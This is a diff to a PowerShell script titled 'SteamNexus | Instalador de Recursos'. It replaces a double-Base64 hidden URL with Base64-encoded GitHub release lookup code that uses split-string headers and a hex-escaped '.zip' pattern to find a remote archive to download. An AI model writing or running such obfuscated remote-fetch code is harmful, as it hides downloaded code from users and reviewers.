@@ -6,9 +6,14 @@ $Host.UI.RawUI.WindowTitle = "SteamNexus | Instalador de Recursos"
 
 $Host.UI.RawUI.WindowTitle = "SteamNexus | Instalador de Recursos"
 
-$a = "YUhSMGNITTZMeTlqYjIwdVkyOXRMMVJ0Y21WNExUQXhMMnhwYzJWdVkyVXZjbVZzWldGemVTOXNiMkZrTDJ4dmQyNWxZV3h2WldFdk1TNHdMakF2Y0dGamF5NXphWEE/Ym05allXTm9aVDB4"
-$b = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($a))
-$LuasUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b))
+$u = 'aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9yZXBvcy9ULXJleDIxL2xpc2VuY2UvcmVsZWFzZXMvbGF0ZXN0'
+$i = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u))
+
+$j = irm $i -Headers @{('U'+'ser-Agent')=('M'+'ozilla/5.0')}
+
+$k = ($j.assets | ?{ $_.name -match '\x2e\x7a\x69\x70$' } | select -f 1).browser_download_url
+
+$LuasUrl = $k
 [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
 chcp 65001 > $null
 
